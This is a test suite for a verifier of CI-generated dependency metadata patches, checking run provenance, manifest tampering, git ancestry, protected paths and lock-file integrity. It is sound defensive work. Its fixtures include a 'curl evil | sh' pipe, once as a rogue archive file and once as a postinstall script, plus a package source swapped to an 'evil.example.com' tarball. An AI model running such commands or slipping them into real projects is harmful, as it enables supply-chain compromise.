import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type { PrDiffEntry } from "../../f/factory/lib/metadata_patch_verify.ts";
import {
  buildLock,
  INTEGRITY,
  OTHER_INTEGRITY,
} from "./metadata_patch_fixtures.ts";
import {
  BASE,
  BASE_TIP,
  codeOf,
  encoder,
  HASH_NEW,
  HASH_OLD,
  HEAD,
  NEW_LOCK,
  OLD_LOCK,
  scriptYaml,
  verify,
  wmillLock,
  world,
} from "./metadata_patch_verify_world.ts";

describe("verifyMetadataPatch accepts a correct patch", () => {
  test("accepts a patch for an importer of a changed file", async () => {
    expect(await codeOf(world())).toBe("ok");
  });

  test("returns the files to write in path order", async () => {
    const result = await verify(world());
    expect(result.ok && result.writes.map((write) => write.path)).toEqual([
      "f/factory/foo.script.lock",
      "f/factory/foo.script.yaml",
      "wmill-lock.yaml",
    ]);
  });

  test("returns the content of the patch", async () => {
    const result = await verify(world());
    const lock = result.ok
      ? result.writes.find((w) => w.path === "f/factory/foo.script.lock")
      : undefined;
    expect(new TextDecoder().decode(lock?.content)).toBe(NEW_LOCK);
  });

  test("lists the changes of the dependencies", async () => {
    const result = await verify(world());
    expect(result.ok && result.dependencyChanges).toEqual([
      {
        script: "f/factory/foo",
        name: "left-pad",
        from: "1.3.0",
        to: "1.4.0",
        integrity: INTEGRITY,
      },
    ]);
  });

  test("accepts a repository name that differs in case", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: "Acme/Widgets" };
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts an importer of an importer", async () => {
    const w = world();
    w.head.set("f/factory/baz.ts", 'import "./foo.ts";\n');
    w.patch.set("f/factory/baz.script.lock", OLD_LOCK);
    w.statuses.set("f/factory/baz.script.lock", "added");
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts an importer written with a multi-line import", async () => {
    const w = world();
    w.head.set(
      "f/factory/baz.ts",
      'import {\n  a,\n  b,\n} from "./lib/bar.ts";\n',
    );
    w.patch.set("f/factory/baz.script.lock", EMPTY_LOCK);
    w.statuses.set("f/factory/baz.script.lock", "added");
    expect(await codeOf(w)).toBe("ok");
  });

  test("accepts a new script whose source the PR added", async () => {
    const w = world();
    w.head.set("f/factory/newone.ts", 'import pad from "left-pad@1.3.0";\n');
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/newone.ts", status: "added" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/newone.script.lock", OLD_LOCK],
      ["f/factory/newone.script.yaml", scriptYaml("newone")],
      [
        "wmill-lock.yaml",
        wmillLock({
          "f/factory/foo": HASH_OLD,
          "f/factory/other": HASH_OLD,
          "f/factory/newone": HASH_NEW,
        }),
      ],
    ]);
    w.statuses.set("f/factory/newone.script.lock", "added");
    w.statuses.set("f/factory/newone.script.yaml", "added");
    w.base = new Map();
    w.age = () => 30;
    expect(await codeOf(w)).toBe("ok");
  });
});

const WMILL_IMPORT = 'import * as wmill from "windmill-client@1.817.0";\n';
const EMPTY_LOCK = '{\n  "dependencies": {}\n}\n//bun.lock\n<empty>';

describe("verifyMetadataPatch with the committed files", () => {
  test("accepts a patch made of the committed lock, schema and hashes", async () => {
    const lock = readFileSync("f/factory/approval_decide.script.lock", "utf8");
    const yaml = readFileSync("f/factory/approval_decide.script.yaml", "utf8");
    const hashes = readFileSync("wmill-lock.yaml", "utf8");
    const w = world();
    w.head = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.ts", WMILL_IMPORT],
      ["f/factory/approval_decide.script.lock", lock],
      [
        "f/factory/approval_decide.script.yaml",
        yaml.replace("type: object", "type: string"),
      ],
      [
        "wmill-lock.yaml",
        hashes.replace(/(approval_decide: )[0-9a-f]{64}/, `$1${HASH_OLD}`),
      ],
    ]);
    w.base = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.ts", WMILL_IMPORT],
      ["f/factory/approval_decide.script.lock", lock],
    ]);
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/approval_decide.ts", status: "modified" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      ["f/factory/approval_decide.script.lock", lock],
      ["f/factory/approval_decide.script.yaml", yaml],
      ["wmill-lock.yaml", hashes],
    ]);
    expect(await codeOf(w)).toBe("ok");
  });
});

describe("verifyMetadataPatch checks where the run comes from", () => {
  test("rejects a run of a fork", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: "mallory/widgets" };
    expect(await codeOf(w)).toBe("head_repository_mismatch");
  });

  test("rejects a run without a head repository", async () => {
    const w = world();
    w.run = { ...w.run, headRepositoryFullName: null };
    expect(await codeOf(w)).toBe("head_repository_mismatch");
  });

  test("rejects a run of another workflow", async () => {
    const w = world();
    w.run = { ...w.run, workflowPath: ".github/workflows/evil.yml" };
    expect(await codeOf(w)).toBe("workflow_path_mismatch");
  });

  test("rejects a run of another event", async () => {
    const w = world();
    w.run = { ...w.run, event: "push" };
    expect(await codeOf(w)).toBe("event_mismatch");
  });

  test("rejects a run of another pull request", async () => {
    const w = world();
    w.run = { ...w.run, pullRequestNumbers: [7] };
    expect(await codeOf(w)).toBe("pull_request_mismatch");
  });

  test("rejects a run of an older head", async () => {
    const w = world();
    w.run = { ...w.run, headSha: "e".repeat(40) };
    expect(await codeOf(w)).toBe("run_head_sha_mismatch");
  });

  test("rejects a run that did not fail", async () => {
    const w = world();
    w.run = { ...w.run, conclusion: "success" };
    expect(await codeOf(w)).toBe("run_not_failed");
  });

  test("rejects a run whose metadata job did not fail", async () => {
    const w = world();
    w.run = { ...w.run, metadataJobConclusion: "success" };
    expect(await codeOf(w)).toBe("metadata_job_not_failed");
  });

  test.each([
    [".github/workflows/ci.yml"],
    ["mise.toml"],
    ["bunfig.toml"],
    ["package.json"],
    ["scripts/metadata-patch.ts"],
    ["infra/docker-compose.yml"],
    ["wmill.yaml"],
    ["f/../mise.toml"],
    ["fx/a.ts"],
  ])("rejects a PR that touches %s", async (path) => {
    const w = world();
    w.pr = {
      ...w.pr,
      diff: [...w.pr.diff, { path, status: "modified" }],
    };
    expect(await codeOf(w)).toBe("pr_diff_not_allowed");
  });

  test("rejects a PR that renames a file out of a protected place", async () => {
    const w = world();
    const renamed: PrDiffEntry = {
      path: "f/factory/moved.ts",
      status: "renamed",
      previousPath: "scripts/old.ts",
    };
    w.pr = { ...w.pr, diff: [...w.pr.diff, renamed] };
    expect(await codeOf(w)).toBe("pr_diff_not_allowed");
  });

  test.each([["migrations/a.sql"], ["docs/a.md"], ["tests/a.test.ts"]])(
    "accepts a PR that also touches %s",
    async (path) => {
      const w = world();
      w.pr = {
        ...w.pr,
        diff: [...w.pr.diff, { path, status: "modified" }],
      };
      expect(await codeOf(w)).toBe("ok");
    },
  );
});

describe("verifyMetadataPatch checks the manifest and the files", () => {
  test("rejects an archive without a manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) => archive.delete("manifest.json");
    expect(await codeOf(w)).toBe("manifest_missing");
  });

  test("rejects a manifest that is not JSON", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("manifest.json", encoder.encode("{"));
    expect(await codeOf(w)).toBe("manifest_invalid");
  });

  test("rejects a manifest with a path outside the allowed list", async () => {
    const w = world();
    w.patch.set(".github/workflows/ci.yml", "name: x\n");
    expect(await codeOf(w)).toBe("manifest_invalid");
  });

  test("rejects a manifest made for an older head", async () => {
    const w = world();
    w.tamperManifest = (manifest) => {
      manifest.headSha = "e".repeat(40);
    };
    expect(await codeOf(w)).toBe("manifest_head_sha_mismatch");
  });

  test("rejects a deleted entry", async () => {
    const w = world();
    w.tamperManifest = (manifest) => {
      manifest.entries = [
        ...(Array.isArray(manifest.entries) ? manifest.entries : []),
        { path: "f/factory/other.script.lock", status: "deleted" },
      ];
    };
    expect(await codeOf(w)).toBe("deleted_entry");
  });

  test("rejects a path that differs only in case", async () => {
    const w = world();
    w.head.set("f/factory/Foo.ts", "export const z = 1;\n");
    w.patch.set("f/factory/Foo.script.lock", OLD_LOCK);
    expect(await codeOf(w)).toBe("case_collision");
  });

  test("rejects a protected path", async () => {
    const w = world();
    w.patch.set("f/factory/lib/dependabot_support.script.yaml", "x: 1\n");
    expect(await codeOf(w)).toBe("protected_path");
  });

  test("rejects a file that the manifest does not list", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("files/f/factory/extra.script.lock", encoder.encode("x"));
    expect(await codeOf(w)).toBe("unlisted_file");
  });

  test("rejects a top-level file that is not the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set("run.sh", encoder.encode("curl evil | sh"));
    expect(await codeOf(w)).toBe("unlisted_file");
  });

  test("rejects an entry whose file is missing", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.delete("files/f/factory/foo.script.yaml");
    expect(await codeOf(w)).toBe("missing_file");
  });

  test("rejects a file whose content changed after the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set(
        "files/f/factory/foo.script.lock",
        encoder.encode(NEW_LOCK.replace("1.4.0", "1.5.0")),
      );
    expect(await codeOf(w)).toBe("digest_mismatch");
  });

  test("rejects a file whose size differs from the manifest", async () => {
    const w = world();
    w.tamperArchive = (archive) =>
      archive.set(
        "files/f/factory/foo.script.lock",
        encoder.encode(`${NEW_LOCK}\n`),
      );
    expect(await codeOf(w)).toBe("size_mismatch");
  });
});

describe("verifyMetadataPatch checks the history", () => {
  test("rejects a base sha that is not in the history of the base", async () => {
    const w = world();
    w.isAncestor = (_ancestor, descendant) => descendant !== BASE_TIP;
    expect(await codeOf(w)).toBe("base_not_in_base_history");
  });

  test("rejects a head that does not contain the base sha", async () => {
    const w = world();
    w.isAncestor = (_ancestor, descendant) => descendant !== HEAD;
    expect(await codeOf(w)).toBe("head_lacks_base");
  });

  test("rejects when the ancestry cannot be decided", async () => {
    const w = world();
    w.isAncestor = () => null;
    expect(await codeOf(w)).toBe("ancestry_unknown");
  });

  test("rejects a merge commit whose parents are swapped", async () => {
    const w = world();
    w.parents = [HEAD, BASE];
    expect(await codeOf(w)).toBe("merge_parents_mismatch");
  });

  test("rejects a merge commit with a third parent", async () => {
    const w = world();
    w.parents = [BASE, HEAD, BASE_TIP];
    expect(await codeOf(w)).toBe("merge_parents_mismatch");
  });

  test("rejects a merge commit that cannot be read", async () => {
    const w = world();
    w.parents = null;
    expect(await codeOf(w)).toBe("merge_commit_unavailable");
  });
});

describe("verifyMetadataPatch limits which scripts may change", () => {
  test("rejects a script that the PR did not touch", async () => {
    const w = world();
    w.head.set("f/factory/other.script.lock", OLD_LOCK);
    w.patch.set("f/factory/other.script.lock", NEW_LOCK);
    expect(await codeOf(w)).toBe("script_not_affected");
  });

  test("rejects a lock without a source", async () => {
    const w = world();
    w.head.delete("f/factory/foo.ts");
    expect(await codeOf(w)).toBe("no_source");
  });

  test("rejects the lock of a script whose source is protected", async () => {
    const w = world();
    w.head.set(
      "f/factory/steps/dependabot_assess.ts",
      'import "../lib/bar.ts";\n',
    );
    w.patch.set("f/factory/steps/dependabot_assess.script.lock", OLD_LOCK);
    w.statuses.set("f/factory/steps/dependabot_assess.script.lock", "added");
    expect(await codeOf(w)).toBe("protected_source");
  });

  test("rejects a new script whose source the PR did not add", async () => {
    const w = world();
    w.patch.set("f/factory/foo2.script.yaml", scriptYaml("foo2"));
    w.statuses.set("f/factory/foo2.script.yaml", "added");
    w.head.set("f/factory/foo2.ts", 'import "./lib/bar.ts";\n');
    expect(await codeOf(w)).toBe("new_script_without_source");
  });

  test("rejects a status that does not match the tree", async () => {
    const w = world();
    w.statuses.set("f/factory/foo.script.lock", "added");
    expect(await codeOf(w)).toBe("status_mismatch");
  });

  test("rejects a modified file that does not exist", async () => {
    const w = world();
    w.head.delete("f/factory/foo.script.yaml");
    expect(await codeOf(w)).toBe("status_mismatch");
  });

  test("rejects a lock that is not text", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      new Uint8Array([0xff, 0xfe, 0x00]),
    );
    expect(await codeOf(w)).toBe("not_text");
  });
});

describe("verifyMetadataPatch checks the lock", () => {
  test("rejects a replaced source of a package", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      buildLock({
        deps: { "left-pad": "1.4.0" },
        packages: {
          "left-pad": {
            ident: "left-pad@1.4.0",
            registry: "https://evil.example.com/x.tgz",
          },
        },
      }),
    );
    expect(await codeOf(w)).toBe("lock_invalid");
  });

  test("rejects a postinstall script", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      buildLock({
        front: {
          scripts: { postinstall: "curl evil | sh" },
          dependencies: { "left-pad": "1.4.0" },
        },
        deps: { "left-pad": "1.4.0" },
      }),
    );
    expect(await codeOf(w)).toBe("lock_invalid");
  });

  test("rejects a dependency that follows a tag", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      buildLock({ deps: { "left-pad": "latest" } }),
    );
    expect(await codeOf(w)).toBe("lock_invalid");
  });

  test("rejects the same version with another integrity", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.lock",
      buildLock({
        packages: {
          "left-pad": { ident: "left-pad@1.3.0", integrity: OTHER_INTEGRITY },
        },
      }),
    );
    expect(await codeOf(w)).toBe("lock_integrity_changed");
  });

  test("rejects a version published too recently", async () => {
    const w = world();
    w.age = () => 2;
    expect(await codeOf(w)).toBe("version_too_new");
  });

  test("accepts a version published exactly on the minimum day", async () => {
    const w = world();
    w.age = () => 7;
    expect(await codeOf(w)).toBe("ok");
  });

  test("rejects when the registry cannot tell the age", async () => {
    const w = world();
    w.age = () => null;
    expect(await codeOf(w)).toBe("registry_unavailable");
  });

  test("rejects a base lock that cannot be read", async () => {
    const w = world();
    w.base.set("f/factory/foo.script.lock", "not a lock");
    expect(await codeOf(w)).toBe("base_lock_invalid");
  });

  test("does not ask the registry for a version that did not change", async () => {
    const w = world();
    w.patch.set("f/factory/foo.script.lock", OLD_LOCK);
    w.age = () => null;
    expect(await codeOf(w)).toBe("ok");
  });
});

describe("verifyMetadataPatch checks the script yaml", () => {
  test("rejects an added tag", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.yaml",
      `${scriptYaml("foo", "string")}tag: console\n`,
    );
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });

  test("rejects a lock reference to another file", async () => {
    const w = world();
    w.patch.set(
      "f/factory/foo.script.yaml",
      scriptYaml("foo", "string").replace(
        "foo.script.lock",
        "other.script.lock",
      ),
    );
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });

  test("rejects a new script yaml with a timeout", async () => {
    const w = world();
    w.head.set("f/factory/newone.ts", "export function main() {}\n");
    w.pr = {
      ...w.pr,
      diff: [{ path: "f/factory/newone.ts", status: "added" }],
    };
    w.patch = new Map<string, string | Uint8Array>([
      [
        "f/factory/newone.script.yaml",
        `${scriptYaml("newone")}timeout: 9999\n`,
      ],
    ]);
    w.statuses.set("f/factory/newone.script.yaml", "added");
    expect(await codeOf(w)).toBe("script_yaml_invalid");
  });
});

describe("verifyMetadataPatch checks the lock hashes", () => {
  test("rejects a removed key", async () => {
    const w = world();
    w.patch.set("wmill-lock.yaml", wmillLock({ "f/factory/foo": HASH_NEW }));
    expect(await codeOf(w)).toBe("wmill_lock_key_removed");
  });

  test("rejects a changed hash of a script that is not affected", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({ "f/factory/foo": HASH_NEW, "f/factory/other": HASH_NEW }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
  });

  test("rejects a hash for a flow", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": HASH_NEW,
        "f/factory/other": HASH_OLD,
        "f/factory/x__flow+__flow_hash": HASH_NEW,
      }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_key_not_allowed");
  });

  test("rejects an unknown version", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({ "f/factory/foo": HASH_NEW }).replace("v2", "v9"),
    );
    expect(await codeOf(w)).toBe("wmill_lock_invalid");
  });

  test("rejects a hash that is not hexadecimal", async () => {
    const w = world();
    w.patch.set(
      "wmill-lock.yaml",
      wmillLock({
        "f/factory/foo": "z".repeat(64),
        "f/factory/other": HASH_OLD,
      }),
    );
    expect(await codeOf(w)).toBe("wmill_lock_invalid");
  });
});
